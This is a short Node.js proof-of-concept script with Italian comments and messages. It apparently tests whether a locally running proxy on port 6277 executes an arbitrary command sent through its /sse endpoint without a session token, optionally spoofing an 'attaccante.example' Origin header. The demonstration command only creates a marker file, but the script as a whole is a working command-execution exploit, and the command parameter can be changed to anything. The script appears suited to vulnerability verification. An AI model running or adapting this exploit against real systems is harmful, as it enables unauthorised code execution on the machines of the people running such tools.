#!/usr/bin/env node
"use strict";

const [, , caso, origine = "nessuna"] = process.argv;
if (!caso) {
  console.error("uso: node attacco.js <caso> <origin:esterna|locale|nessuna>");
  process.exit(2);
}

const percorso = `/sse?transportType=stdio&command=touch&args=/condiviso/exploit-${caso}`;
const headers = {};
if (origine === "esterna") headers.Origin = "http://attaccante.example";
else if (origine === "locale") headers.Origin = "http://localhost:6274";

console.log(`richiesta: GET ${percorso}`);
console.log(`header inviati: ${JSON.stringify(headers)} (nessun token di sessione)`);

fetch("http://127.0.0.1:6277" + percorso, { headers })
  .then(async (r) => {
    console.log(`HTTP ${r.status} ${r.statusText}`);
    console.log(`header della risposta: ${JSON.stringify(Object.fromEntries(r.headers))}`);
    if (r.status !== 200) console.log(await r.text());
    console.log(r.status);
    // tempo al processo avviato dal proxy per creare il file prima della verifica
    setTimeout(() => process.exit(0), 500);
  })
  .catch((e) => {
    console.log("[errore di rete] " + e.message);
    console.log("indeterminato");
    process.exit(0);
  });
